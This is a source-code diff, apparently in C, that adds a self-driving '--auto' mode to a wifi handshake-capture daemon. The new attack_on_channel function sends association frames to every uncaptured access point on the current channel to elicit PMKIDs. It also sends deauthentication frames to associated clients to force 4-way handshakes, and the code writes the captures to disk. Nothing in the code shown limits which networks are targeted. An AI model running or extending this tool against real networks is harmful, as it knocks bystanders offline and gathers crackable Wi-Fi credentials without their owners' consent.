@@ -54,6 +54,8 @@ struct app {
 	time_t             health_progress;  /* last time frames advanced / hop was off */
 	int                mac_rand;   /* --mac-rand applied to inject when created */
 	int                pmkid_only; /* S2: autonomous attack does assoc only, no deauth */
+	int                auto_mode;  /* AU3: self-driving --auto mode */
+	char               auto_vif[16]; /* AU2: monitor vif we created ("" = none) */
 	const char        *state_file; /* R1: recon-table persistence path ("" disables) */
 	int                state_max_age; /* R1: ignore persisted state older than this (s) */
 	time_t             started;
@@ -64,6 +66,7 @@ static struct app  *g_app;
 /* forward decls — used before their definitions appear */
 static int ensure_table(struct app *a);
 static int ensure_handshake(struct app *a);
+static void attack_on_channel(struct app *a, int channel);
 static int ensure_inject(struct app *a);
 static int ensure_hopper(struct app *a);
 
@@ -173,7 +176,12 @@ static int reply_error(struct ipc *s, int fd, int64_t id, const char *err)
 
 static void on_chanhop_tick(int channel, int freq, void *user)
 {
-	emit_event_iface_channel(user, channel, freq);
+	struct app *a = user;
+	emit_event_iface_channel(a, channel, freq);
+	/* AU4: in --auto, couple the attack to the dwell — inject at the APs on
+	 * the channel we just tuned to (off-channel frames never reach them). */
+	if (a->auto_mode)
+		attack_on_channel(a, channel);
 }
 
 /* ---- timerfd glue: dispatch chanhop's fd into chanhop_on_timer ------------ */
@@ -838,6 +846,53 @@ static int handle_delete_handshake(struct app *a, int fd, int64_t id, const char
 #define ATTACK_MAX_ATTEMPTS   10   /* give up on a target that won't yield */
 #define ATTACK_PER_TICK        8   /* cap assoc (and deauth) launched per tick */
 
+/* AU4: attack the uncaptured APs on `channel`. Called from the chanhop hook
+ * in --auto so injection always lands on the tuned channel. PMKID-first
+ * (directed assoc elicits the M1 PMKID, clientless); deauth associated
+ * clients to force the 4-way unless pmkid_only. Honours the P2 captured-skip,
+ * per-target cooldown, and attempt cap. */
+static void attack_on_channel(struct app *a, int channel)
+{
+	if (!a->table || !a->capture || !capture_is_running(a->capture)) return;
+	if (ensure_inject(a) < 0) return;
+	time_t now = time(NULL);
+
+	struct ap_record aps[TABLE_MAX_APS];
+	int n_aps = table_snapshot_aps(a->table, aps, TABLE_MAX_APS);
+	int assoc_sent = 0, deauth_sent = 0;
+
+	for (int i = 0; i < n_aps && assoc_sent < ATTACK_PER_TICK; i++) {
+		if (aps[i].channel != channel) continue;    /* on-channel only */
+		if (aps[i].captured) continue;
+		if (aps[i].attack_count >= ATTACK_MAX_ATTEMPTS) continue;
+		if (aps[i].last_attack && now - aps[i].last_attack < ATTACK_COOLDOWN_SEC)
+			continue;
+		const char *ssid = aps[i].ssid_len ? aps[i].ssid : NULL;
+		inject_assoc(a->inject, aps[i].bssid, ssid, aps[i].ssid_len);
+		table_note_ap_attacked(a->table, aps[i].bssid, now);
+		assoc_sent++;
+	}
+
+	if (!a->pmkid_only) {
+		struct sta_record stas[TABLE_MAX_STAS];
+		int n_stas = table_snapshot_stas(a->table, stas, TABLE_MAX_STAS);
+		for (int i = 0; i < n_stas && deauth_sent < ATTACK_PER_TICK; i++) {
+			if (stas[i].channel != channel) continue;   /* on-channel only */
+			if (!stas[i].have_ap) continue;
+			if (table_ap_is_captured(a->table, stas[i].ap_bssid)) continue;
+			if (stas[i].attack_count >= ATTACK_MAX_ATTEMPTS) continue;
+			if (stas[i].last_attack && now - stas[i].last_attack < ATTACK_COOLDOWN_SEC)
+				continue;
+			inject_deauth(a->inject, stas[i].ap_bssid, stas[i].mac, 2, 7);
+			table_note_sta_attacked(a->table, stas[i].mac, now);
+			deauth_sent++;
+		}
+	}
+
+	if (assoc_sent + deauth_sent > 0)
+		log_debug("auto: ch %d - %d assoc + %d deauth", channel, assoc_sent, deauth_sent);
+}
+
 static void on_attack_timer(int fd, uint32_t events, void *user)
 {
 	(void)events;
@@ -931,7 +986,30 @@ struct autostart_opts {
 	int         hop_interval_ms;
 	int         attack;
 	int         attack_interval_ms;
+	int         auto_mode;     /* AU3: self-driving --auto (hop-coupled attack) */
 };
+
+/* AU2/AU3: create a monitor vif on `base`'s wiphy and leave the base
+ * (managed) netdev down — the brcmfmac invariant. Fills `mon_out` with the
+ * vif name ("<base>mon") and records it in a->auto_vif for cleanup only when
+ * we actually created it. */
+static int auto_prepare_vif(struct app *a, const char *base,
+                            char *mon_out, size_t cap)
+{
+	struct iface tmp;
+	if (iface_open(&tmp, base) < 0) {
+		log_err("auto: iface_open(%s) failed — not a wifi interface?", base);
+		return -1;
+	}
+	iface_link_down(&tmp);
+	snprintf(mon_out, cap, "%smon", base);
+	int rc = iface_add_monitor_vif(&tmp, mon_out);
+	iface_close(&tmp);
+	if (rc < 0) return -1;
+	if (rc == 1)   /* we created it -> we remove it on exit */
+		snprintf(a->auto_vif, sizeof a->auto_vif, "%s", mon_out);
+	return 0;
+}
 
 static int autostart(struct app *a, const struct autostart_opts *o)
 {
@@ -971,27 +1049,53 @@ static int autostart(struct app *a, const struct autostart_opts *o)
 	}
 	log_info("autostart: capturing on %s", o->iface);
 
-	if (o->n_channels > 0) {
+	/* Channels: use the given list, else (auto mode) ask the regdomain,
+	 * else fall back to the 2.4 GHz default. */
+	int        auto_ch[CHANHOP_MAX_CHANNELS];
+	const int *channels   = o->channels;
+	int        n_channels = o->n_channels;
+	if (n_channels == 0 && o->auto_mode) {
+		int n = iface_supported_channels(&a->iface, auto_ch, CHANHOP_MAX_CHANNELS);
+		if (n > 0) {
+			channels   = auto_ch;
+			n_channels = n;
+			log_info("autostart: auto-detected %d channels", n);
+		} else {
+			channels   = DEFAULT_CHANNELS;
+			n_channels = DEFAULT_N_CHANNELS;
+			log_warn("autostart: channel auto-detect returned none, using default 1-%d",
+			         DEFAULT_N_CHANNELS);
+		}
+	}
+
+	if (n_channels > 0) {
 		if (ensure_hopper(a) < 0) {
 			log_err("autostart: hopper init failed");
 			return -1;
 		}
-		if (chanhop_start(a->hopper, o->channels, o->n_channels,
+		if (chanhop_start(a->hopper, channels, n_channels,
 		                  o->hop_interval_ms) < 0) {
 			log_err("autostart: chanhop_start failed");
 			return -1;
 		}
 		log_info("autostart: hopping %d channels at %dms",
-		         o->n_channels, o->hop_interval_ms);
+		         n_channels, o->hop_interval_ms);
 	}
 
 	if (o->attack) {
-		a->attack_fd = start_attack_timer(a, o->attack_interval_ms);
-		if (a->attack_fd < 0)
-			log_warn("autostart: attack timer failed — attacks disabled");
-		else
-			log_info("autostart: autonomous attacks enabled (%dms interval)",
-			         o->attack_interval_ms);
+		if (o->auto_mode) {
+			/* AU4: attacks are driven per-dwell from on_chanhop_tick, so
+			 * injection lands on the tuned channel. No separate timer. */
+			a->auto_mode = 1;
+			log_info("autostart: autonomous attacks enabled (per-channel, --auto)");
+		} else {
+			a->attack_fd = start_attack_timer(a, o->attack_interval_ms);
+			if (a->attack_fd < 0)
+				log_warn("autostart: attack timer failed — attacks disabled");
+			else
+				log_info("autostart: autonomous attacks enabled (%dms interval)",
+				         o->attack_interval_ms);
+		}
 	}
 
 	return 0;
@@ -1218,6 +1322,9 @@ static int handle_stats(struct app *a, int fd, int64_t id)
 	if ((r = proto_field_bool(buf, sizeof buf, pos, &first, "pmkid_only",
 	                          a->pmkid_only)) < 0) return -1;
 	pos = (size_t)r;
+	if ((r = proto_field_bool(buf, sizeof buf, pos, &first, "auto",
+	                          a->auto_mode)) < 0) return -1;
+	pos = (size_t)r;
 	if ((r = proto_field_str(buf, sizeof buf, pos, &first, "iface_mode",
 	                         iface_mode_name(a->iface.mode))) < 0) return -1;
 	pos = (size_t)r;
@@ -1294,6 +1401,7 @@ struct opts {
 	const char *state_file;
 	int         state_max_age;
 	const char *log_format;
+	int         auto_mode;     /* --auto: self-driving standalone capture */
 };
 
 static void usage(FILE *f, const char *argv0)
@@ -1327,7 +1435,11 @@ static void usage(FILE *f, const char *argv0)
 	    "      --state-file PATH    Recon-table persistence file\n"
 	    "                           (default: " DEFAULT_STATE_FILE "; \"\" disables)\n"
 	    "      --state-max-age S    Ignore persisted state older than S seconds\n"
-	    "      --log-format FMT     Log format: text (default) or json\n",
+	    "      --log-format FMT     Log format: text (default) or json\n"
+	    "      --auto               Self-driving mode: create the monitor vif,\n"
+	    "                           auto-detect channels, sniff + attack, and\n"
+	    "                           write handshakes with no external driver\n"
+	    "                           (base iface via -i, default wlan0)\n",
 	    argv0, DEFAULT_HOP_INTERVAL_MS, DEFAULT_ATTACK_INTERVAL_MS);
 }
 
@@ -1408,6 +1520,7 @@ static int parse_opts(int argc, char **argv, struct opts *o)
 		OPT_STATE_FILE,
 		OPT_STATE_MAX_AGE,
 		OPT_LOG_FORMAT,
+		OPT_AUTO,
 	};
 	static const struct option longopts[] = {
 		{ "config",           required_argument, NULL, 'c' },
@@ -1428,6 +1541,7 @@ static int parse_opts(int argc, char **argv, struct opts *o)
 		{ "state-file",       required_argument, NULL, OPT_STATE_FILE },
 		{ "state-max-age",    required_argument, NULL, OPT_STATE_MAX_AGE },
 		{ "log-format",       required_argument, NULL, OPT_LOG_FORMAT },
+		{ "auto",             no_argument,       NULL, OPT_AUTO },
 		{ 0 },
 	};
 	int c;
@@ -1454,6 +1568,7 @@ static int parse_opts(int argc, char **argv, struct opts *o)
 		case OPT_STATE_FILE:      o->state_file = optarg; break;
 		case OPT_STATE_MAX_AGE:   o->state_max_age = atoi(optarg); break;
 		case OPT_LOG_FORMAT:      o->log_format = optarg; break;
+		case OPT_AUTO:            o->auto_mode = 1; break;
 		default:  usage(stderr, argv[0]); return -1;
 		}
 	}
@@ -1552,8 +1667,9 @@ int main(int argc, char **argv)
 	int rc = parse_opts(argc, argv, &o);
 	if (rc != 0) return rc < 0 ? 1 : 0;
 
-	/* If --iface was given but no --channels, use the default 2.4 GHz list. */
-	if (o.iface && o.n_channels == 0) {
+	/* If --iface was given but no --channels, use the default 2.4 GHz list.
+	 * --auto detects channels itself, so don't pre-fill there. */
+	if (o.iface && o.n_channels == 0 && !o.auto_mode) {
 		for (int i = 0; i < DEFAULT_N_CHANNELS; i++)
 			o.channels[i] = DEFAULT_CHANNELS[i];
 		o.n_channels = DEFAULT_N_CHANNELS;
@@ -1584,7 +1700,30 @@ int main(int argc, char **argv)
 	g_app = &a;
 	ipc_set_on_line(a.ipc, on_line, &a);
 
-	if (o.iface) {
+	if (o.auto_mode) {
+		/* AU3: self-driving. Create our own monitor vif on the base iface's
+		 * wiphy (base left down), then bring up capture + hop (auto channels)
+		 * + per-channel attack with no external driver. */
+		const char *base = o.iface ? o.iface : "wlan0";
+		char mon[16];
+		if (auto_prepare_vif(&a, base, mon, sizeof mon) < 0) {
+			log_err("--auto: monitor-vif setup on %s failed", base);
+		} else {
+			struct autostart_opts ao = {
+				.iface           = mon,
+				.hs_dir          = o.hs_dir,
+				.channels        = NULL,   /* auto-detect */
+				.n_channels      = 0,
+				.hop_interval_ms = o.hop_interval_ms,
+				.attack          = 1,
+				.auto_mode       = 1,
+			};
+			if (autostart(&a, &ao) < 0)
+				log_err("--auto: autostart failed");
+			else
+				log_info("--auto: self-driving capture on %s", mon);
+		}
+	} else if (o.iface) {
 		struct autostart_opts ao = {
 			.iface              = o.iface,
 			.hs_dir             = o.hs_dir,
@@ -1613,6 +1752,8 @@ int main(int argc, char **argv)
 	if (a.table && a.state_file && *a.state_file)
 		state_save(a.table, a.state_file);   /* R1: persist for the next respawn */
 	if (a.table)   table_destroy(a.table);
+	if (a.auto_vif[0])              /* AU2: remove the monitor vif we created */
+		iface_del_vif(&a.iface, a.auto_vif);
 	iface_close(&a.iface);
 	ipc_destroy(a.ipc);
 	g_app = NULL;
